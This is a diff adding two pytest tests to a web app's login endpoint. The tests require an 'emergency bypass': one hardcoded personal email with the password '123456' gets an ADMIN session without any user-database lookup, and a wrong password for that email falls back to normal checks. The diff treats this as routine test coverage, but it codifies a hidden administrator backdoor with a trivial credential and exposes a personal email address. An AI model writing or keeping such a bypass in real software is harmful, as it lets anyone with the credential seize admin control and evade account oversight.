@@ -95,6 +95,51 @@ def test_auth_login_rehashes_matching_plaintext_password(client, monkeypatch):
     assert rehashed[0][1].startswith(("pbkdf2:", "scrypt:"))
 
 
+def test_auth_login_emergency_bypass_creates_admin_session(client, monkeypatch):
+    lookup_calls = []
+
+    def fake_buscar_usuario_login(email):
+        lookup_calls.append(email)
+        return None
+
+    monkeypatch.setattr("app.gestao_op_buscar_usuario_login", fake_buscar_usuario_login)
+
+    resp = client.post(
+        "/api/auth/login",
+        json={"email": "matheuscosta.tecnologia@gmail.com", "password": "123456"},
+    )
+
+    assert resp.status_code == 200
+    body = resp.get_json()
+    assert body["ok"] is True
+    assert body["redirect_to"] == "/"
+    assert lookup_calls == []
+
+    with client.session_transaction() as sess:
+        assert sess["usuario_email"] == "matheuscosta.tecnologia@gmail.com"
+        assert sess["usuario_nome"] == "matheus"
+        assert sess["perfil_id"] == "ADMIN"
+        assert sess["logged_in"] is True
+
+
+def test_auth_login_emergency_email_wrong_password_uses_normal_validation(client, monkeypatch):
+    lookup_calls = []
+
+    def fake_buscar_usuario_login(email):
+        lookup_calls.append(email)
+        return None
+
+    monkeypatch.setattr("app.gestao_op_buscar_usuario_login", fake_buscar_usuario_login)
+
+    resp = client.post(
+        "/api/auth/login",
+        json={"email": "matheuscosta.tecnologia@gmail.com", "password": "senha-errada"},
+    )
+
+    assert resp.status_code == 401
+    assert lookup_calls == ["matheuscosta.tecnologia@gmail.com"]
+
+
 def test_auth_login_rejects_inactive_user(client, monkeypatch):
     from werkzeug.security import generate_password_hash
 
